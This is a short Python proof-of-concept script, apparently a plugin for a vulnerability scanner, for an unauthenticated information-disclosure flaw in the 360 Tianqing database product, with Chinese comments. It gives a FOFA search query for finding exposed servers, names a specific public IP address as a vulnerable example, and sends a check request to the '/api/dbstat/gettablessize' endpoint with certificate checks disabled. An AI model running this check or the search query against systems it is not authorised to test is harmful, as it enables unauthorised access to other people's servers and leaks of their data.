# coding:utf-8  
import requests
from lib.common import url_handle,get_random_ua
# ...
import urllib3
urllib3.disable_warnings()
_info = {
    "author" : "jijue",                      # POC作者
    "version" : "1",                    # POC版本，默认是1  
    "CreateDate" : "2021-06-09",        # POC创建时间
    "UpdateDate" : "2021-06-09",        # POC创建时间
    "PocDesc" : """
    略  
    """,                                # POC描述，写更新描述，没有就不写

    "name" : "天擎数据库未授权访问导致信息泄露漏洞",                        # 漏洞名称
    "AppName" : "360天擎数据库",                     # 漏洞应用名称
    "AppVersion" : "",                  # 漏洞应用版本
    "VulnDate" : "2021-06-09",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
    "VulnDesc" : """
    天擎 存在未授权越权访问，造成敏感信息泄露
    """,                                # 漏洞简要描述

    "fofa-dork":"title=\"360新天擎\"",                     # fofa搜索语句
    "example" : "https://183.166.187.208:8443/api/dbstat/gettablessize",                     # 存在漏洞的演示url，写一个就可以了
    "exp_img" : "",                      # 先不管  

    "timeout" : 10,                      # 超时设定
}

def verify(host,proxy):
    """
    返回vuln

    存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

    不存在漏洞：vuln = [False,""]
    """
    vuln = [False,""]
    url = url_handle(host) + "/api/dbstat/gettablessize" # url自己按需调整

    

    headers = {"User-Agent":get_random_ua(),
                "Connection":"close",
                # "Content-Type": "application/x-www-form-urlencoded",
                }
    
    try:
        """
        检测逻辑，漏洞存在则修改vuln值，漏洞不存在则不动
        """
        req = requests.get(url,headers = headers , proxies = proxy ,timeout = _info["timeout"],verify = False)
        if req.status_code == 200 and "\"result\":0,\"reason\":\"success\"" in req.text:
            vuln = [True,req.text]
        else:
            vuln = [False,req.text]
    except Exception as e:
        raise e
    
    return vuln

